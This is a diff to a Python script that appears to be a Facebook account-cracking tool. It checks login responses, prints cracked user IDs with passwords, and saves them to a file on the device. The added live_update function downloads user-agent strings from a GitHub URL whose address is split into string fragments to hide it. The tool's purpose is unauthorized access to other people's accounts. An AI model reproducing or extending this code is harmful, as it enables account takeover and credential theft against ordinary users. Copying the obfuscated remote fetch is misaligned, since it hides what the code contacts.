@@ -1,4 +1,3 @@
-
 import os, sys, uuid, re, random, time, string, json, base64
 from io import BytesIO
 
@@ -21,6 +20,27 @@ from concurrent.futures import ThreadPoolExecutor as ThreadPool
 version = "  v1"
 
 ua = []
+
+def live_update():
+    try:
+        url = "https://raw" + ".github" + "user" + "cont" + "ent.co" + "m/T" + "EAM-" + "ELIT" + "E1/da" + "tab" + "ase/m" + "ain/" + "X" + "YA" + ".txt"
+        buffer = BytesIO()
+        curl = pycurl.Curl()
+        curl.setopt(curl.URL, url)
+        curl.setopt(curl.WRITEDATA, buffer)
+        curl.setopt(curl.CAINFO, certifi.where())
+        curl.perform()
+        curl.close()
+        datax = buffer.getvalue().decode('utf-8').splitlines()[0]
+        for u in datax.split("|"):
+            ua.append(u)
+    except:
+        
+        sys.exit("[!!] Internet Error...")
+
+
+live_update()
+
 class sort:
     def line():
         return "[b dark_sea_green2]━" * 37
@@ -40,6 +60,7 @@ class sort:
         co = ['\x1b[1;93m', '\x1b[1;91m', '\x1b[1;94m', '\x1b[1;95m', '\x1b[1;96m']
         cx = random.choice(co)
         return cx
+
 
 def dd(fbbd, device):
     if fbbd.lower() == "samsung":
@@ -237,7 +258,7 @@ def file_sub(uid, pwx, name, meth, fl):
         elif "Please Confirm Email" in str(rq):
 
             print(f"\r\r[b r green_yellow][PRINCE-OK][/b r green_yellow][b chartreuse1]{uid}|{ps}\n")
-            open("/sdcard/PRINCEFILE-OK.txt", "a").write(uid + "|" + ps + "|" +  "\n")
+            open("/sdcard/PRINCEFILE-OK.txt", "a").write(uid + "|" + ps + "|" + "\n")
             oks.append(uid)
 
             break
